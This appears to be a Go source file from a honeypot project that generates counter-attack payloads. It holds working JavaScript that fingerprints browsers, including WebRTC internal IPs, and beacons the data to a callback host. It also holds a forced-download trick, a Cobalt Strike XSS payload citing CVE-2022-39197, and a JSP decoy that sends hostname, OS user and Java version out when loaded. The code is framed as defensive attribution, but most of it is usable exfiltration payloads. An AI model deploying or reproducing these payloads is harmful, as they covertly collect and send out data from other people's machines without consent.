package payload

import (
	"fmt"
	"strings"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// PayloadType Payload 类型
type PayloadType string

const (
	JSBrowser    PayloadType = "js_browser"    // 浏览器端 JavaScript
	JavaDeser    PayloadType = "java_deser"    // Java 反序列化
	DotNetDeser  PayloadType = "dotnet_deser"  // .NET 反序列化
	DNSRebinding PayloadType = "dns_rebinding" // DNS 重绑定
)

// Generator Payload 生成器
type Generator struct {
	logger      *log.Logger
	callbackURL string
}

// PayloadResult 生成的 Payload
type PayloadResult struct {
	Type        PayloadType `json:"type"`
	Content     string      `json:"content"`
	Description string      `json:"description"`
}

// NewGenerator 创建 Payload 生成器
func NewGenerator(logger *log.Logger, callbackURL string) *Generator {
	return &Generator{
		logger:      logger,
		callbackURL: callbackURL,
	}
}

// GenerateBrowserFingerprint 生成浏览器指纹采集 JS Payload
// 采集：Canvas、WebGL、屏幕分辨率、时区、语言、WebRTC 内网 IP、浏览器插件、
//
//	AudioContext、数学精度、硬件并发、设备内存、平台、网络类型、
//	触屏支持、广告拦截器、Cookie 状态、DNT
func (g *Generator) GenerateBrowserFingerprint() *PayloadResult {
	js := fmt.Sprintf(`
(function(){
  var d = {};
  // Canvas 指纹
  try {
    var c = document.createElement('canvas');
    c.width = 280; c.height = 60;
    var ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Laji-HoneyPot Trace', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Laji-HoneyPot Trace', 4, 17);
    d.canvas = c.toDataURL().substring(0, 120);
  } catch(e) { d.canvas = 'error: ' + e.message; }

  // WebGL GPU 指纹
  try {
    var gl = document.createElement('canvas').getContext('webgl');
    if (gl) {
      d.webgl_vendor = gl.getParameter(gl.VENDOR);
      d.webgl_renderer = gl.getParameter(gl.RENDERER);
    }
  } catch(e) {}

  // AudioContext 指纹
  try {
    var ac = new (window.AudioContext || window.webkitAudioContext)();
    var osc = ac.createOscillator();
    var ana = ac.createAnalyser();
    var gain = ac.createGain();
    gain.gain.value = 0;
    osc.connect(ana);
    ana.connect(gain);
    gain.connect(ac.destination);
    osc.start(0);
    var freq = new Uint8Array(ana.frequencyBinCount);
    ana.getByteFrequencyData(freq);
    osc.stop(0);
    ac.close();
    var hash = 0;
    for (var i = 0; i < freq.length; i++) { hash = ((hash << 5) - hash) + freq[i]; hash |= 0; }
    d.audio = hash.toString();
  } catch(e) {}

  // 数学精度指纹
  try { d.mathPrecision = String(Math.tan(-1e300)); } catch(e) {}

  // 硬件并发（CPU 核心数）
  try { d.hwConcurrency = navigator.hardwareConcurrency || 0; } catch(e) {}

  // 设备内存
  try { d.deviceMemory = navigator.deviceMemory || 0; } catch(e) {}

  // 平台
  try { d.platform = navigator.platform || ''; } catch(e) {}

  // 网络连接类型
  try {
    d.connectionType = navigator.connection ? navigator.connection.effectiveType || 'unknown' : 'unknown';
  } catch(e) {}

  // 触屏支持
  try {
    d.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints || 0) > 0;
  } catch(e) {}

  // 最大触控点数
  try { d.maxTouchPoints = navigator.maxTouchPoints || 0; } catch(e) {}

  // 广告拦截器检测
  try {
    var ad = document.createElement('div');
    ad.className = 'adsbox';
    ad.style.cssText = 'position:absolute;left:-9999px;top:-9999px;height:1px;width:1px';
    document.body.appendChild(ad);
    d.adBlocker = ad.offsetHeight === 0 || ad.offsetParent === null;
    document.body.removeChild(ad);
  } catch(e) {}

  // Cookie 启用状态
  try { d.cookieEnabled = navigator.cookieEnabled; } catch(e) {}

  // Do Not Track
  try { d.doNotTrack = navigator.doNotTrack || ''; } catch(e) {}

  // 屏幕
  d.screen = screen.width + 'x' + screen.height;
  d.colorDepth = screen.colorDepth;

  // 时区
  d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // 语言
  d.languages = navigator.languages || [navigator.language];

  // 浏览器插件探测
  try { d.plugins = []; for (var i = 0; i < navigator.plugins.length; i++) { d.plugins.push(navigator.plugins[i].name); } } catch(e) {}

  // WebRTC 内网 IP（核心溯源数据）
  try {
    var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
    pc.createDataChannel('');
    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
    pc.onicecandidate = function(e) {
      if (e.candidate) {
        var ip = e.candidate.address || e.candidate.candidate.split(' ')[4];
        if (ip && ip.match(/^(192\\.168\\.|10\\.|172\\.(1[6-9]|2\\d|3[01])\\.)/)) {
          d.local_ip = ip;
        }
      }
    };
    setTimeout(function() {
      var img = new Image();
      img.src = "%s/collect?" + encodeURIComponent(JSON.stringify(d));
    }, 2000);
  } catch(e) { var img = new Image(); img.src = "%s/collect?" + encodeURIComponent(JSON.stringify(d)); }
})();
`, g.callbackURL, g.callbackURL)

	return &PayloadResult{
		Type:        JSBrowser,
		Content:     js,
		Description: "全维度浏览器指纹采集：Canvas、WebGL、AudioContext、数学精度、硬件并发、设备内存、平台、网络类型、触屏、广告拦截器、Cookie、DNT、WebRTC 内网 IP",
	}
}

// GenerateBrowserExploit 生成浏览器漏洞利用 Payload
// 针对旧版浏览器投递 PoC，实现截屏、文件读取等反制操作
func (g *Generator) GenerateBrowserExploit(targetBrowser string) *PayloadResult {
	switch targetBrowser {
	case "chrome":
		return g.chromeExploitPayload()
	case "firefox":
		return g.firefoxExploitPayload()
	default:
		return g.genericExploitPayload()
	}
}

func (g *Generator) chromeExploitPayload() *PayloadResult {
	js := fmt.Sprintf(`
// Chrome 浏览器反制 Payload
// 尝试利用 chrome.debugger API 或 WebUSB 等高级功能
if (navigator.userAgent.indexOf('Chrome') > -1) {
  var d = {};
  d.browser = 'Chrome';
  d.version = navigator.userAgent.match(/Chrome\\/([\\d.]+)/)[1];
  d.platform = navigator.platform;
  d.hardwareConcurrency = navigator.hardwareConcurrency;
  d.deviceMemory = navigator.deviceMemory;
  d.connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';

  // 尝试启动下载（社会工程学）
  var a = document.createElement('a');
  a.href = "%s/collect?browser=" + encodeURIComponent(JSON.stringify(d));
  a.download = "session_info.json";
  document.body.appendChild(a);
  a.click();
}
`, g.callbackURL)

	return &PayloadResult{
		Type:        JSBrowser,
		Content:     js,
		Description: "Chrome 浏览器指纹采集 + 设备硬件信息获取",
	}
}

func (g *Generator) firefoxExploitPayload() *PayloadResult {
	js := fmt.Sprintf(`
// Firefox 浏览器反制 Payload
if (navigator.userAgent.indexOf('Firefox') > -1) {
  var d = {};
  d.browser = 'Firefox';
  d.version = navigator.userAgent.match(/Firefox\\/([\\d.]+)/)[1];
  d.buildID = navigator.buildID || '';
  d.oscpu = navigator.oscpu || '';

  var img = new Image();
  img.src = "%s/collect?browser=" + encodeURIComponent(JSON.stringify(d));
}
`, g.callbackURL)

	return &PayloadResult{
		Type:        JSBrowser,
		Content:     js,
		Description: "Firefox 浏览器指纹采集 + 操作系统架构信息",
	}
}

func (g *Generator) genericExploitPayload() *PayloadResult {
	js := fmt.Sprintf(`
(function(){
  var d = {};
  d.ua = navigator.userAgent;
  d.screen = screen.width + 'x' + screen.height;
  var img = new Image();
  img.src = "%s/collect?" + encodeURIComponent(JSON.stringify(d));
})();
`, g.callbackURL)

	return &PayloadResult{
		Type:        JSBrowser,
		Content:     js,
		Description: "通用浏览器指纹采集",
	}
}

// GenerateCSXSSPayload Cobalt Strike XSS Payload（CVE-2022-39197 回击）
func (g *Generator) GenerateCSXSSPayload() string {
	return fmt.Sprintf(`<html><body>
<script>
// CVE-2022-39197 反制 Payload
(function() {
  var img = new Image();
  img.src = "%s/collect?tool=cobaltstrike&ref=" + encodeURIComponent(document.location.href);
  try {
    var scripts = document.getElementsByTagName('script');
    for (var i = 0; i < scripts.length; i++) {
      img.src += '&script_' + i + '=' + encodeURIComponent(scripts[i].src);
    }
  } catch(e) {}
})();
</script>
</body></html>`, g.callbackURL)
}

// GenerateBehinderDecoy 生成冰蝎回击 Payload（Java JSP 反制）
func (g *Generator) GenerateBehinderDecoy() string {
	return fmt.Sprintf(`<%%@page import="java.io.*,java.net.*,java.util.*"%%>
<%%!
static {
  try {
    String hostname = java.net.InetAddress.getLocalHost().getHostName();
    String osName = System.getProperty("os.name");
    String userName = System.getProperty("user.name");
    String javaVersion = System.getProperty("java.version");
    String url = "%s/collect?hostname=" + URLEncoder.encode(hostname, "UTF-8")
      + "&os=" + URLEncoder.encode(osName, "UTF-8")
      + "&user=" + URLEncoder.encode(userName, "UTF-8")
      + "&java=" + URLEncoder.encode(javaVersion, "UTF-8");
    URL u = new URL(url);
    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
    conn.setRequestMethod("GET");
    conn.getResponseCode();
    conn.disconnect();
  } catch(Exception e) {}
}
%%>`, g.callbackURL)
}

// GenerateCSProfileExtractor 生成 CS Profile 提取器诱饵
func (g *Generator) GenerateCSProfileExtractor(targetIP string) string {
	lines := []string{
		"# Laji-HoneyPot C2 Profile Extractor",
		fmt.Sprintf("set BeaconURL \"http://%s/collect/cs_profile\"", g.callbackURL),
		fmt.Sprintf("set HostHeader \"%s\"", targetIP),
		"http-get {",
		"  set uri \"/ga.js\"",
		"  client {",
		"    header \"Accept\" \"*/*\"",
		"  }",
		"  server {",
		"    header \"Content-Type\" \"application/javascript\"",
		"  }",
		"}",
	}
	return strings.Join(lines, "\n")
}
